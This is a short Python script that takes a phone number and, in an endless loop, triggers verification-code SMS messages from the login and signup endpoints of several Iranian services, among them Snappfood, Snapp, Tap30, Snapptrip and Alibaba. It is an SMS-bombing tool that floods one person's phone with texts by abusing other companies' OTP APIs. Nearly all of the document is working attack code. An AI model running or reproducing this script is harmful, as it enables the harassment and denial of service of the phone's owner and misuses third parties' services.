import requests, sys, time

if len(sys.argv) != 2:
    print("data not val, help: \npython3 sms.py (Phone Number)")
    sys.exit()
else:
    phone = sys.argv[1].strip()
    phone_shad = phone.replace("0","98")
    while True:
        data_snap_food = {'cellphone':phone,'captcha':'111'}
        snap_food = requests.post("https://snappfood.ir/auth/login_with_no_pass", data=data_snap_food)
        data_snap = {"type":2,"phone":phone}
        snap = requests.post("https://api.snapp.ir/api/v1/sms/link", data=data_snap)
        data_shad = {"api_version":"3","method":"sendCode","data":{"phone_number":phone_shad,"send_type":"SMS"}}
        shad = requests.post("https://shadmessenger103.iranlms.ir/", json=data_shad)
        data_tp30 = {"credential":{"phoneNumber":phone,"role":"PASSENGER"}}
        tp30 = requests.post("https://tap33.me/api/v2/user", json=data_tp30)
        hamyarzaban_data = {'phone':phone}
        hamyarzaban = requests.post("https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php")
        snaptrip_data = {"lang":"fa","country_id":"860","password":"fhj5tvT6D9jWkPw","mobile_phone":phone,"country_code":"+98"}
        snaptrip = requests.post("https://www.snapptrip.com/register", json=snaptrip_data)
        alibaba_data = {"phoneNumber":phone}
        alibaba = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=alibaba_data)
